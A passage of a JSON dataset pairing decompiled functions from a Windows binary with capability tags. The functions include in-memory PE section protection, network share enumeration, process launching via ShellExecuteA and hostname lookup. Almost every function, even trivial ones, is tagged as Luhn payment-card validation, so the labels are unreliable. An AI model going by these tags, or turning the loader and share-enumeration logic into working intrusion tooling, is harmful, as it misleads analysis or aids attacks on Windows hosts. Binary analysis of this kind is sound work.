        "decompiled_code": "\nvoid fcn.00461ec8(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint uStack28;\n    uint uStack24;\n    uchar *puStack20;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack20 = &stack0xfffffffc;\n    uStack24 = 0x461fbb;\n    uStack28 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe4;\n    puStack32 = 0x461ef1;\n    uVar1 = fcn.00404620();\n    *(in_EAX + 0x4c) = uVar1;\n    uStack36 = 0x461f9b;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    puStack32 = &stack0xfffffffc;\n    fcn.00461c6c();\n    *in_FS_OFFSET = uStack40;\n    puStack32 = 0x461fa5;\n    uStack36 = 0x461f25;\n    iVar2 = (**(**(in_EAX + 0x4c) + 0x14))();\n    if (iVar2 < 1) {\n        uStack36 = 0x461f39;\n        (**(**(in_EAX + 0x4c) + 0x38))();\n    }\n    uStack36 = 0x461f47;\n    iVar2 = fcn.0041f9b4();\n    *(iVar2 + 0xf) = 1;\n    uStack36 = 0x461f56;\n    fcn.0041fbc0();\n    uStack36 = 0x461f63;\n    fcn.00487b08();\n    uStack36 = 0x461f71;\n    (**(**(in_EAX + 0x4c) + 0x1c))();\n    uStack36 = 0x461f7b;\n    fcn.00487ab8();\n    uStack36 = 0x461f88;\n    fcn.00487b04();\n    uStack36 = 0x461f8f;\n    fcn.0041fe70();\n    uStack36 = 0x461f9a;\n    fcn.0040f934();\n    return;\n}\n",
        "token_count": 547
    },
    "00462138": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00462138(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 4) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 144
    },
    "004639f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004639f8(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint *in_FS_OFFSET;\n    uint uStack172;\n    uint uStack168;\n    uchar *puStack164;\n    uint var_90h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    int32_t *var_4h;\n    \n    puStack164 = &stack0xfffffffc;\n    var_4h = NULL;\n    uStack168 = 0x463ac1;\n    uStack172 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffff54;\n    if ((-1 < param_2) && (iVar2 = fcn.0040676c(),  param_2 < iVar2)) {\n        uVar1 = *(*(in_EAX + 0x50) + 0xc + param_2 * 0x18);\n        (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n        uVar3 = fcn.00463708();\n        if ((uVar3 & 0x80000000) == 0) {\n            var_ch = 0;\n            var_10h = 0;\n            (**(*var_4h + 0x14))(var_4h, &fcn.004639f8::var_ch, &fcn.004639f8::var_10h);\n            uVar3 = (**(*var_4h + 0x18))(var_4h, uVar1, &fcn.004639f8::var_8h, &fcn.004639f8::var_90h);\n            if ((uVar3 & 0x80000000) == 0) {\n                (**(*var_4h + 0xc))(var_4h, var_8h);\n            }\n        }\n        (**(**(in_EAX + 0xc) + 0x1c))(*(in_EAX + 0xc));\n    }\n    *in_FS_OFFSET = uStack172;\n    puStack164 = 0x463ac8;\n    uStack168 = 0x463ac0;\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 521
    },
    "00463ad4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00463ad4(uint *arg_8h)\n\n{\n    int32_t *piVar1;\n    char cVar2;\n    int32_t in_EAX;\n    int32_t iVar3;\n    uint *in_EDX;\n    uint *puVar4;\n    uint *puVar5;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack1332;\n    uint uStack1328;\n    uchar *puStack1324;\n    uint var_518h;\n    uint var_4c0h;\n    uint var_48ch;\n    uint32_t var_488h;\n    uint var_480h;\n    int32_t var_54h;\n    int32_t *var_50h;\n    uint var_4ch;\n    int32_t *var_4h;\n    \n    var_4h = NULL;\n    puStack1324 = 0x463afa;\n    fcn.00405fe8();\n    uStack1328 = 0x463c0c;\n    piStack1332 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffacc;\n    *in_EDX = 0;\n    *var_50h = 0;\n    puStack1324 = &stack0xfffffffc;\n    (**(**(in_EAX + 0xc) + 0x24))(*(in_EAX + 0xc));\n    (**(**(in_EAX + 0x38) + 0x10))(*(in_EAX + 0x38));\n    iVar3 = fcn.00463708();\n    if (iVar3 == 0) {\n        (**(*var_4h + 0x10))(var_4h, &fcn.00463ad4::var_54h);\n        fcn.00406208();\n        cVar2 = fcn.00462814();\n        if (cVar2 != '\\0') {\n            fcn.00403af4();\n            puVar4 = *(var_54h + 0x44);\n            puVar5 = &fcn.00463ad4::var_518h;\n            for (iVar3 = 0x16; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar5 = *puVar4;\n                puVar4 = puVar4 + 1;\n                puVar5 = puVar5 + 1;\n            }\n            fcn.004030fc();\n            *in_EDX = var_48ch;\n            *var_50h = (var_488h ^ var_488h >> 0x1f) - (var_488h >> 0x1f);\n            *arg_8h = var_480h;\n        }\n    }\n    (**(**(in_EAX + 0x38) + 0x18))(*(in_EAX + 0x38), 0, 0);\n    piVar1 = *(in_EAX + 0xc);\n    (**(*piVar1 + 0x1c))();\n    *in_FS_OFFSET = piVar1;\n    fcn.004060ac(0x463c13);\n    fcn.0040700c();\n    return;\n}\n",
        "token_count": 696
    },
    "00463c48": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00463c48(void)\n\n{\n    int32_t iVar1;\n    int32_t **in_FS_OFFSET;\n    int32_t *piStack48;\n    int32_t *piStack44;\n    int32_t *piStack40;\n    int32_t *piStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_5h;\n    \n    puStack28 = 0x463c56;\n    iVar1 = fcn.00404a1c();\n    uStack32 = 0x463cdb;\n    piStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffdc;\n    piStack40 = 0x463c74;\n    puStack28 = &stack0xfffffffc;\n    fcn.004636d4();\n    piStack40 = *(iVar1 + 0xc);\n    piStack44 = 0x463c80;\n    (**(*piStack40 + 0x24))();\n    piStack44 = *(iVar1 + 0x38);\n    piStack48 = 0x463c8c;\n    (**(*piStack44 + 0x10))();\n    piStack48 = 0x463c94;\n    fcn.0046365c();\n    piStack48 = 0x463c9c;\n    fcn.00463674();\n    *in_FS_OFFSET = piStack44;\n    piStack36 = 0x463ce2;\n    piStack44 = 0x463cd0;\n    piStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    piStack40 = &stack0xfffffffc;\n    fcn.00404640();\n    *in_FS_OFFSET = piStack48;\n    return;\n}\n",
        "token_count": 385
    },
    "004640e4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004640e4(uint param_1, char param_2)\n\n{\n    uint in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00463ffc();\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 128
    },
    "00464194": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00464194(void)\n\n{\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uint uStack32;\n    uint uStack28;\n    uchar *puStack24;\n    uint var_4h;\n    \n    puStack24 = 0x4641ac;\n    fcn.0042edb0();\n    *(in_EAX + 0x10) = 0;\n    *(in_EAX + 0x14) = 0;\n    puStack24 = 0x4641c2;\n    fcn.00405530();\n    if (*(in_EAX + 4) != 0) {\n        uStack28 = 0x4641f1;\n        uStack32 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffe0;\n        puStack24 = &stack0xfffffffc;\n        fcn.00404650();\n        *(in_EAX + 4) = 0;\n        *in_FS_OFFSET = uStack32;\n        puStack24 = 0x464203;\n        fcn.00463f7c();\n        *(in_EAX + 9) = 0;\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "00464d3c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00464d3c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *0x497f44 = fcn.004640e4();\n    fcn.00464c60();\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 5) = 0;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 184
    },
    "00464ef4": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.00464ef4(void)\n\n{\n    int32_t *piVar1;\n    int32_t iVar2;\n    uint *in_FS_OFFSET;\n    uint uStack60;\n    uint uStack56;\n    uchar *puStack52;\n    uint uStack48;\n    uint uStack44;\n    uchar *puStack40;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack40 = &stack0xfffffffc;\n    uStack44 = 0x464fde;\n    uStack48 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd0;\n    puStack52 = 0x464f22;\n    piVar1 = fcn.00404620();\n    puStack52 = 0x464f31;\n    fcn.004640e4();\n    uStack56 = 0x464fb9;\n    uStack60 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc4;\n    puStack52 = &stack0xfffffffc;\n    fcn.00464184();\n    fcn.00405530();\n    iVar2 = (**(*piVar1 + 0x14))();\n    if (-1 < iVar2 + -1) {\n        do {\n            (**(*piVar1 + 0xc))(0);\n            uStack56 = 0;\n            uStack60 = 0x464ff4;\n            fcn.004058e0();\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n    }\n    fcn.00405584();\n    *in_FS_OFFSET = uStack60;\n    puStack52 = 0x464fc0;\n    uStack56 = 0x464fb0;\n    fcn.00404650();\n    uStack56 = 0x464fb8;\n    fcn.00404650();\n    return;\n}\n",
        "token_count": 429
    },
    "004651e0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004651e0(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + arg_8h;\n    return;\n}\n",
        "token_count": 54
    },
    "00465210": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00465210(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return in_EAX + arg_8h;\n}\n",
        "token_count": 97
    },
    "00465254": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00465254(uint param_1, int32_t param_2)\n\n{\n    uint uVar1;\n    int32_t in_EAX;\n    uint *in_FS_OFFSET;\n    uchar auStack28 [12];\n    \n    uVar1 = *in_FS_OFFSET;\n    *in_FS_OFFSET = auStack28;\n    *in_FS_OFFSET = uVar1;\n    return param_2 + in_EAX;\n}\n",
        "token_count": 96
    },
    "004652ac": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004652ac(uint32_t arg_8h)\n\n{\n    uint32_t uVar1;\n    \n    uVar1 = fcn.004652a4();\n    return CONCAT44(CARRY4(arg_8h, uVar1) + CARRY4(*(arg_8h + 0x14), arg_8h + uVar1), *(arg_8h + 0x14) + arg_8h + uVar1)\n    ;\n}\n",
        "token_count": 105
    },
    "00465850": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00465850(int32_t *arg_8h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint lpflOldProtect;\n    int32_t var_4h;\n    \n    var_4h = fcn.004652ac(*arg_8h);\n    uVar4 = *(*arg_8h + 6);\n    if (-1 < uVar4 - 1) {\n        do {\n            if ((*(var_4h + 0x27) & 2) == 0) {\n                uVar2 = fcn.004657d8(*(var_4h + 0x24));\n                uVar1 = *(var_4h + 0x24);\n                if ((uVar1 & 0x4000000) != 0) {\n                    uVar2 = uVar2 | 0x200;\n                }\n                iVar3 = *(var_4h + 0x10);\n                if (iVar3 == 0) {\n                    if ((uVar1 & 0x40) == 0) {\n                        if ((uVar1 & 0x80) != 0) {\n                            iVar3 = *(*arg_8h + 0x24);\n                        }\n                    }\n                    else {\n                        iVar3 = *(*arg_8h + 0x20);\n                    }\n                    if ((iVar3 != 0) &&\n                       (iVar3 = sub.kernel32.dll_VirtualProtect(*(var_4h + 8), *(var_4h + 0x10), uVar2, &lpflOldProtect)\n                       ,  iVar3 == 0)) {\n                        fcn.00405584();\n                        return;\n                    }\n                }\n                fcn.004651e0(0x28, 0);\n            }\n            else {\n                sub.kernel32.dll_VirtualFree_1(*(var_4h + 8), *(var_4h + 0x10), 0x4000);\n                fcn.004651f8(0x28, 0);\n            }\n            uVar4 = uVar4 - 1;\n        } while (uVar4 != 0);\n    }\n    return;\n}\n",
        "token_count": 492
    },
    "00466054": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00466054(void)\n\n{\n    uint *in_FS_OFFSET;\n    uint uStack16;\n    uint uStack12;\n    uchar *puStack8;\n    \n    puStack8 = &stack0xfffffffc;\n    uStack12 = 0x466085;\n    uStack16 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack16;\n    *0x497f48 = *0x497f48 + 1;\n    if (*0x497f48 == 0) {\n        fcn.00405530();\n    }\n    *in_FS_OFFSET = uStack16;\n    return;\n}\n",
        "token_count": 136
    },
    "00466160": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466160(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t iVar1;\n    \n    if ((param_2 < 0) || (in_EAX[2] <= param_2)) {\n        fcn.004661c4();\n    }\n    iVar1 = fcn.004661c8();\n    in_EAX[2] = in_EAX[2] + -1;\n    if (param_2 < in_EAX[2]) {\n        fcn.004030fc();\n    }\n    if (iVar1 != 0) {\n        (**(*in_EAX + 4))();\n    }\n    return;\n}\n",
        "token_count": 156
    },
    "00466240": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466240(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    \n    if ((param_2 < *(in_EAX + 8)) || (0x7ffffff < param_2)) {\n        fcn.004661c4();\n    }\n    if (param_2 != *(in_EAX + 0xc)) {\n        fcn.00402f34();\n        *(in_EAX + 0xc) = param_2;\n    }\n    return;\n}\n",
        "token_count": 117
    },
    "00466278": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00466278(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    if ((param_2 < 0) || (0x7ffffff < param_2)) {\n        fcn.004661c4();\n    }\n    if (*(in_EAX + 0xc) < param_2) {\n        fcn.00466240();\n    }\n    if (*(in_EAX + 8) < param_2) {\n        fcn.00403af4();\n    }\n    else {\n        iVar1 = *(in_EAX + 8) + -1;\n        iVar2 = param_2 - iVar1;\n        if (iVar2 == 0 || param_2 < iVar1) {\n            iVar2 = iVar2 + -1;\n            do {\n                fcn.00466160();\n                iVar2 = iVar2 + 1;\n            } while (iVar2 != 0);\n        }\n    }\n    *(in_EAX + 8) = param_2;\n    return;\n}\n",
        "token_count": 243
    },
    "0046642c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0046642c(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uStack24;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    *(in_EAX + 0x104) = 0;\n    fcn.0046669c();\n    *(in_EAX + 0x15c) = 1;\n    *(in_EAX + 0x15e) = 1;\n    *(in_EAX + 0x160) = 0x5622;\n    *(in_EAX + 0x164) = 0x5622;\n    *(in_EAX + 0x168) = 1;\n    *(in_EAX + 0x16a) = 8;\n    *(in_EAX + 0x16c) = 0x81;\n    *(in_EAX + 0x1dd) = 1;\n    *(in_EAX + 0x1df) = 1;\n    *(in_EAX + 0x1e1) = 0x5622;\n    *(in_EAX + 0x1e5) = 0x5622;\n    *(in_EAX + 0x1e9) = 1;\n    *(in_EAX + 0x1eb) = 8;\n    *(in_EAX + 0x1ed) = 0x81;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uStack24;\n    }\n    return in_EAX;\n}\n",
        "token_count": 396
    },
    "00466508": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00466508(int32_t arg_8h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = *(arg_8h + -4);\n    *(iVar1 + 0x108) = 0x54;\n    *(iVar1 + 0x10c) = 0;\n    *(iVar1 + 0x110) = 0;\n    *(iVar1 + 0x114) = *(*(arg_8h + -4) + 0xf0);\n    *(iVar1 + 0x118) = *(*(arg_8h + -4) + 0xf8);\n    *(iVar1 + 0x11c) = 0;\n    *(iVar1 + 0x120) = 0;\n    *(iVar1 + 0x124) = *(*(arg_8h + -4) + 0xf4);\n    *(iVar1 + 0x128) = *(*(arg_8h + -4) + 0xfc);\n    *(iVar1 + 300) = 0;\n    *(iVar1 + 0x130) = 0;\n    return;\n}\n",
        "token_count": 251
    },
    "00466578": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00466578(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint uStack76;\n    uchar *puStack72;\n    uint uStack68;\n    uint uStack64;\n    int32_t iStack60;\n    uint uStack56;\n    int32_t iStack52;\n    uint uStack48;\n    int32_t iStack44;\n    int32_t iStack40;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint uStack24;\n    uint var_4h;\n    \n    *(in_EAX + 0x100) = 1;\n    uStack24 = 0;\n    uStack28 = 0;\n    uStack32 = 0;\n    uStack36 = 0;\n    iStack40 = in_EAX + 0x1dd;\n    iStack44 = in_EAX + 0x15c;\n    uStack48 = 0;\n    iStack52 = in_EAX + 0x104;\n    uStack56 = 0x4665b6;\n    sub.msacm32.dll_acmStreamOpen();\n    uStack56 = 0;\n    iStack60 = in_EAX + 0xfc;\n    uStack64 = *(in_EAX + 0xf8);\n    uStack68 = *(in_EAX + 0x104);\n    puStack72 = 0x4665da;\n    sub.msacm32.dll_acmStreamSize();\n    puStack72 = 0x4665e8;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 0xf0) = uVar1;\n    puStack72 = 0x4665ff;\n    uVar1 = fcn.00402f00();\n    *(in_EAX + 0xf4) = uVar1;\n    uStack76 = 0x466641;\n    uStack80 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb0;\n    puStack72 = &stack0xfffffffc;\n    fcn.00466508(&stack0xfffffffc);\n    uVar1 = *(in_EAX + 0x104);\n    sub.msacm32.dll_acmStreamPrepareHeader(uVar1, in_EAX + 0x108, 0);\n    *in_FS_OFFSET = uVar1;\n    *(in_EAX + 0xec) = 1;\n    return;\n}\n",
        "token_count": 550
    },
    "00466710": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00466710(uint noname_0, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code **in_ECX;\n    \n    (**in_ECX)(arg_ch, arg_10h, arg_14h);\n    return 0;\n}\n",
        "token_count": 66
    },
    "004668c0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.004668c0(uint param_1, char param_2)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    char extraout_DL;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    \n    if (param_2 != '\\0') {\n        in_EAX = fcn.00404974();\n        param_2 = extraout_DL;\n    }\n    fcn.00404620();\n    uVar1 = fcn.00404620();\n    *(in_EAX + 8) = uVar1;\n    *(in_EAX + 4) = 0;\n    *(in_EAX + 0xc) = 0x2000;\n    *(in_EAX + 0x94) = 0;\n    uVar2 = 0x466b24;\n    uVar1 = fcn.004667e4(0x466b24, in_EAX);\n    *(in_EAX + 0x98) = uVar1;\n    *(in_EAX + 0x91) = 4;\n    if (param_2 != '\\0') {\n        fcn.004049cc();\n        *in_FS_OFFSET = uVar2;\n    }\n    return in_EAX;\n}\n",
        "token_count": 275
    },
    "004677d8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nvoid fcn.004677d8(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack24;\n    uint uStack20;\n    uchar *puStack16;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = 0;\n    puStack16 = 0x4677ee;\n    fcn.004059cc();\n    uStack20 = 0x467845;\n    uStack24 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffe8;\n    puStack16 = &stack0xfffffffc;\n    fcn.00405864(0, 0);\n    uVar1 = fcn.004059dc();\n    uVar2 = 0;\n    sub.shell32.dll_ShellExecuteA(0, 0x467864, 0x46785c, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.00405554(0x46784c);\n    return;\n}\n",
        "token_count": 229
    },
    "00467e4c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get hostname"
        ],
        "decompiled_code": "\nvoid fcn.00467e4c(void)\n\n{\n    uint uStack28;\n    uchar auStack24 [20];\n    \n    uStack28 = 0x10;\n    sub.kernel32.dll_GetComputerNameA(auStack24, &uStack28);\n    fcn.004057a0();\n    return;\n}\n",
        "token_count": 70
    },
    "0046885c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0046885c(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uVar3;\n    uint uStack320;\n    uint uStack316;\n    uchar *puStack312;\n    uint var_12ch;\n    uint var_128h;\n    uint var_124h;\n    uint pszPath;\n    uint pidl;\n    int32_t *var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_14h = NULL;\n    var_10h = 0;\n    puStack312 = 0x468891;\n    var_8h = param_2;\n    fcn.004059cc();\n    puStack312 = 0x468899;\n    fcn.004059cc();\n    puStack312 = 0x4688a1;\n    fcn.004059cc();\n    uStack316 = 0x4689ca;\n    uStack320 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffec0;\n    uVar3 = 0;\n    puStack312 = &stack0xfffffffc;\n    iVar1 = sub.shell32.dll_SHGetSpecialFolderLocation(0, 0x10, &fcn.0046885c::pidl);\n    if (iVar1 == 0) {\n        sub.shell32.dll_SHGetPathFromIDListA(pidl, &fcn.0046885c::pszPath);\n        fcn.0042bdc4();\n        fcn.00407050();\n        uVar2 = fcn.004059dc();\n        (**(*var_14h + 0x1c))(var_14h, uVar2);\n        uVar2 = fcn.004059dc();\n        (**(*var_14h + 0x50))(var_14h, uVar2);\n        (**(*var_14h + 0x3c))(var_14h, 5);\n        fcn.004057a0();\n        fcn.004058e0(0x4689fc, var_8h, 0x4689f0, 0);\n        uVar2 = fcn.0040646c(0xffffffff);\n        fcn.00407050(uVar2);\n        (**(_pe_dos_header + 0x18))(0);\n    }\n    *in_FS_OFFSET = uVar3;\n    fcn.0040700c(0x4689d1);\n    fcn.00405530();\n    fcn.0040700c();\n    fcn.0040700c();\n    fcn.00405554();\n    return;\n}\n",
        "token_count": 600
    },
    "00468b90": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_14h\n\nvoid fcn.00468b90(void)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t unaff_EBX;\n    int32_t *in_FS_OFFSET;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint uVar6;\n    int32_t iStack76;\n    int32_t iStack72;\n    uchar *var_40h;\n    int32_t var_3ch;\n    uint var_38h;\n    uint *var_34h;\n    uint var_30h;\n    uint *var_2ch;\n    uint *var_28h;\n    uint *var_24h;\n    int32_t var_20h;\n    uint var_1ch;\n    uchar *var_18h;\n    uint var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    var_18h = &stack0xfffffffc;\n    iVar2 = 8;\n    do {\n        var_4h = 0;\n        iVar2 = iVar2 + -1;\n    } while (iVar2 != 0);\n    var_1ch = 0x468df0;\n    var_20h = *in_FS_OFFSET;\n    *in_FS_OFFSET = &fcn.00468b90::var_20h;\n    var_24h = 0x468bb7;\n    var_ch = unaff_EBX;\n    iVar2 = fcn.004032f8();\n    if (iVar2 == 0) {\n        var_4h = 0;\n    }\n    else {\n        var_24h = 0x468bcf;\n        fcn.00403358();\n        var_24h = 0x468bd7;\n        var_4h = fcn.004059dc();\n    }\n    var_24h = 0x468be1;\n    fcn.00405530();\n    var_10h = 0;\n    var_14h = 0;\n    var_18h = NULL;\n    var_24h = &fcn.00468b90::var_18h;\n    var_28h = &fcn.00468b90::var_14h;\n    var_2ch = &fcn.00468b90::var_10h;\n    var_30h = 0xffffffff;\n    var_34h = &fcn.00468b90::var_8h;\n    var_38h = 0;\n    var_3ch = var_4h;\n    var_40h = 0x468c0d;\n    iVar2 = sub.netapi32.dll_NetShareEnum();\n    if (iVar2 == 0) {\n        iVar2 = var_10h;\n        if (0 < var_10h) {\n            do {\n                iStack76 = *in_FS_OFFSET;\n                *in_FS_OFFSET = &stack0xffffffb4;\n                iStack72 = var_4h;\n                var_40h = &stack0xfffffffc;\n                iVar1 = sub.netapi32.dll_NetShareGetInfo();\n                if (iVar1 == 0) {\n                    fcn.00405728();\n                    fcn.00405818();\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x468e08;\n                    uVar3 = *(var_ch + 4);\n                    uVar5 = 0;\n                    fcn.00409e4c(uVar3);\n                    fcn.004058e0(var_24h, uVar3, uVar5, uVar6, uVar4);\n                    fcn.00405728(0x468e08, *in_EAX);\n                    fcn.004058e0(var_28h);\n                    uVar4 = *in_EAX;\n                    uVar6 = 0x468e08;\n                    